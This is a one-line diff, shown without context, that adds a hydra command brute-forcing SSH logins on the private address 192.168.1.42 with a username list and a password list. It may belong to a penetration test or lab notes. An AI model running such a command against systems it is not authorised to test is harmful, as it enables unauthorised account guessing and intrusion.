@@ -1,0 +1,1 @@
+hydra -L users.txt -P passwords.csv 192.168.1.42 ssh -t 4
